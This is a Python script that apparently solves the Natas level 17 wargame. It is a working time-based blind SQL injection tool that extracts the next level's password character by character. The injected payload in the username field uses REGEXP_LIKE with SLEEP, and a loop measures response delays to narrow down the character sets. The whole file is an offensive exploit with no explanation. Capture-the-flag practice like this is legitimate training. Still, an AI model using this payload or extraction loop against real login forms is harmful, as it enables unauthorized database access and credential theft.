import time
import Auther
import string

password = ""


def predicate(prefix: str, nextChar: str, threshold: int = 3):
    start_time = time.time()
    Auther.request(17,
                   data={
                       'username': f'natas18" AND IF(REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c"), SLEEP({threshold}), SLEEP(0)) AND "" LIKE "'
                   })
    end_time = time.time()
    return (end_time - start_time) >= threshold
    # return (end_time - start_time) >= threshold if (end_time - start_time) >= 0.5 else predicate(prefix, nextChar, threshold)


while predicate(password, '[[:alnum:]]', 5):
    print(f"Progress: {password.ljust(32, '*')} -> ", end="")
    chosen_chaset = string.ascii_letters
    if predicate(password, '[[:alpha:]]'):
        chosen_chaset = string.ascii_uppercase if predicate(
            password, '[[:upper:]]') else string.ascii_lowercase
    else:
        chosen_chaset = string.digits
    best = None
    for char in chosen_chaset:
        if predicate(password, char):
            best = char
            break
    if best is None:
        print("Error, retrying")
        continue
    password += char
    print(password)
print(f"Final password: {password}")
